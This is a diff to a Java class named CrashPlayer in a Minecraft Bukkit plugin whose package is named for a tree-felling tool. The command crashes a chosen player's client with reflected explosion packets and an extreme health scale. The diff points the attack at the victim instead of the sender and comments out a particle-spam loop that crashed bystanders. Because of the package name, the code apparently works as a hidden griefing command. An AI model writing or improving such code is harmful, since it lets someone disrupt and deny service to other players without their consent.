@@ -6,7 +6,6 @@ import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
-import org.bukkit.Particle;
 import org.bukkit.entity.Player;
 import org.bukkit.scheduler.BukkitRunnable;
 
@@ -33,7 +32,7 @@ public class CrashPlayer extends Command {
                 p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " is being crashed using combined method (packet, health and particles)!");
                 new BukkitRunnable() {
                     final Class<?> packetGameStateClass = ReflectionUtils.getMinecraftClass("PacketPlayOutExplosion");
-                    final Object nmsPlayer = p.getClass().getMethod("getHandle").invoke(p);
+                    final Object nmsPlayer = anotherPlayer.getClass().getMethod("getHandle").invoke(anotherPlayer);
                     final Field playerConnectionField = nmsPlayer.getClass().getField("playerConnection");
                     final Object pConnection = playerConnectionField.get(nmsPlayer);
                     int times = 0;
@@ -78,10 +77,11 @@ public class CrashPlayer extends Command {
         } catch (Exception ignored) {
 
         }
-        for (int f = 0; f < 1000; f++) {
+        // ↓ that crashes other playes :( ↓
+        /*for (int f = 0; f < 1000; f++) {
             p.spawnParticle(Particle.HEART, p.getLocation(), Integer.MAX_VALUE);
             p.spawnParticle(Particle.EXPLOSION_HUGE, p.getLocation(), Integer.MAX_VALUE);
-        }
+        }*/
         p.setHealthScale(Integer.MAX_VALUE);
     }
 }
